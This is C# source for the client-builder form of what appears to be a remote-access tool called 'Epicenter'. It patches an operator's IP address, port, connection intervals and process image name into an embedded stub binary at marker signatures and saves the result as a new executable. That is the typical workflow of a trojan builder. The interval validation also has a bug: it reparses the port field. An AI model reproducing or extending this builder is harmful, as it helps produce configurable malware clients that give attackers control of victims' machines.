using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;

namespace Epicenter_SERVER
{
    public partial class CreateClient : Form
    {
        public CreateClient()
        {
            InitializeComponent();
        }

        private void btnCreate_Click(object sender, EventArgs e)
        {
            #region Some checks
            if (String.IsNullOrEmpty(txtName.Text) || String.IsNullOrEmpty(txtIP.Text) || String.IsNullOrEmpty(txtComm.Text) ||
                String.IsNullOrEmpty(txtAuth.Text) || String.IsNullOrEmpty(txtConn.Text) || String.IsNullOrEmpty(txtImageName.Text))
            { 
                MessageBox.Show("Please fill all the fields.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            int port = 0;
            if ( !Int32.TryParse(txtComm.Text, out port) )
            {
                MessageBox.Show("Please enter a numerical value into the PORT field.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int interval = 0;
            if ( !Int32.TryParse(txtAuth.Text, out interval) || !Int32.TryParse(txtComm.Text, out interval) )
            {
                MessageBox.Show("Please enter a numerical value into the intervals.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (txtName.Text.Contains("<%SEP%>") || txtName.Text.Contains("<retn>") || txtName.Text.Contains("YEPTRUPTASKAMELANAZ") ||
                txtName.Text.Contains("BEASDZXXXMEL") || txtImageName.Text.Contains("<%SEP%>") || txtImageName.Text.Contains("<retn>") ||
                txtImageName.Text.Contains("YEPTRUPTASKAMELANAZ") || txtImageName.Text.Contains("BEASDZXXXMEL"))
            {
                MessageBox.Show("You've entered an invalid name. Please change your variables.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            #endregion

            long signatureA = SeekSignature("BEASDZXXXMEL");
            long signatureB = SeekSignature("YEPTRUPTASKAMELANAZ");

            if (signatureA == -1 || signatureB == -1)
            {
                MessageBox.Show("There is a problem with the stub.\nMore specifically, the signatures can't be determined.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string dataToWrite = txtIP.Text + "<%SEP%>" + txtComm.Text + "<%SEP%>" + txtName.Text + "<%SEP%>" + txtConn.Text + "<%SEP%>" +
                txtAuth.Text + "<%SEP%>" + txtImageName.Text + "<%SEP%>A" + "<retn>"; // We can add dump location later on.

            if (dataToWrite.Length > 122)
            {
                MessageBox.Show("The data to write into stub is too long.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            byte[] byteToWrite = UTF8Encoding.UTF8.GetBytes(dataToWrite);

            long locationInStub = signatureA + 12;
            for (int i = 0; i < dataToWrite.Length; i++)
            {
                stub[locationInStub] = byteToWrite[i];
                locationInStub++;
            }

            SaveFileDialog dia = new SaveFileDialog();

            if (dia.ShowDialog() == DialogResult.OK)
            {
                FileStream fs = new FileStream(dia.FileName, FileMode.Create, FileAccess.Write);
                fs.Write(stub, 0, stub.Length);

                fs.Close();
                fs.Dispose();

                MessageBox.Show("Client created successfully.", "Client Created", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }

        }

        byte[] stub = Resource.client;
        private long SeekSignature(string _signature)
        {
            byte[] signatureA = UTF8Encoding.UTF8.GetBytes(_signature);
            
            MemoryStream ms = new MemoryStream(stub);
            byte chTemp;
            long latestHitBeginningLocation = 0;
            int locationInArray = 0;
            long FileLen;
            long CurrentPos = 0;

            FileLen = stub.Length;

            while (locationInArray < signatureA.Length)
            {
                chTemp = (byte)ms.ReadByte();
                CurrentPos++;

                if (chTemp == signatureA[locationInArray])
                {
                    if (locationInArray == 0)
                        latestHitBeginningLocation = ms.Position - 1;

                    if (locationInArray == signatureA.Length)
                        break;

                    locationInArray++;
                }
                else
                {
                    locationInArray = 0;
                    latestHitBeginningLocation = 0;
                }

                if (CurrentPos >= FileLen)
                {
                    if (ms != null) { ms.Close(); ms.Dispose(); }
                    return -1;
                }
            }
            if (ms != null) { ms.Close(); ms.Dispose(); }
            return latestHitBeginningLocation;
        }
    }
}
